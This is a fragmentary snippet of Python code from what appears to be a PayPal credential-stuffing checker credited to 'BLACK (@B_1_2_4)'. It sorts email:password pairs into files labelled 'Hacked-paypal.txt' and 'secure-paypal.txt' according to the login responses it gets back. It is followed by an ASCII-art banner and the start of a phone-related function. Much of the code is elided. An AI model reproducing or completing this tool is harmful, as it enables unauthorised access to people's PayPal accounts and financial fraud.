...
'Paypal-Request-Id': '1a9154e6b56f43e69f8a96045c33d2ff'}
	...
	if error in send.text:
		...
		with open('Hacked-paypal.txt', 'a') as J:J.write(eml+':'+pess+' |BLACK MIROR\n')
		...
		with open('secure-paypal.txt', 'a') as J:J.write(eml+':'+pess+' |BLACK MIROR\n')
...
▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████        ███         ▀██████▀    ███    ███ ████████▀    ██████████      
               ███    ███               PAYPAL                                     ███    ███                              
                             ▄︻̷̿┻̿═━一 BY BLACK (@B_1_2_4 ) ╾━╤デ╦︻(▀̿Ĺ̯▀̿ ̿)"""+White)
	File_Mail()
def phone():
	print("""\n
 ______                       _     
